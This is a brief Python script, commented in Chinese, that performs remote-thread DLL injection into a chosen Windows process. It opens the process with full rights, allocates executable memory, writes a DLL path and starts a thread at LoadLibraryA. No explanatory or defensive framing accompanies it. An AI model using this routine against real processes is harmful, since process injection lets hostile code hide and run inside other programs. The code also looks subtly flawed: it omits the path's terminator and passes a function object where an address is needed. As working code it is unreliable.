import ctypes

def dll_injection(target_process_id, dll_path):
    kernel32 = ctypes.WinDLL('kernel32')

    # 開啟目標進程
    process_handle = kernel32.OpenProcess(0x1F0FFF, False, target_process_id)
    
    # 在目標進程空間中配置一塊記憶體區域，用來儲存DLL檔案路徑
    dll_path_address = kernel32.VirtualAllocEx(process_handle, 0, len(dll_path), 0x1000, 0x40)
    
    # 在目標進程中寫入DLL檔案路徑
    kernel32.WriteProcessMemory(process_handle, dll_path_address, dll_path, len(dll_path), 0)
    
    # 在目標進程中載入指定的DLL檔案
    thread_id = ctypes.c_ulong()
    kernel32.CreateRemoteThread(process_handle, None, 0, kernel32.LoadLibraryA, dll_path_address, 0, ctypes.byref(thread_id))
    
    kernel32.CloseHandle(process_handle)